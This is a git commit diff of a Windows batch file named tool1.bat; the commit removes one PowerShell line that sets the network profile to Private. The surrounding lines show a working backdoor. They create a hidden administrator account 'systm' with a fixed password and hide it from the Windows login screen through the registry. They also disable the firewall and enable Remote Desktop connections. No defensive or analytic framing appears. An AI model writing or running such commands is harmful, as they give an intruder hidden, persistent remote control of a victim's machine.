160a9f6a579138bf9ac5383f074f6e8569a4f2ab
Ömer Efe ÇELİK <heblushabus@aaal.net.tr>
2024-03-25 01:00:55 +0300

    Update tool1.bat

--- tool1.bat
+++ tool1.bat
@@ -3,7 +3,6 @@ net localgroup Administrators systm /add
 net user systm oursecurepass
 reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v systm /t REG_DWORD /d 0 /f
 
-powershell.exe -Command "Set-NetConnectionProfile -NetworkCategory Private"
 netsh advfirewall set currentprofile state off
 
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
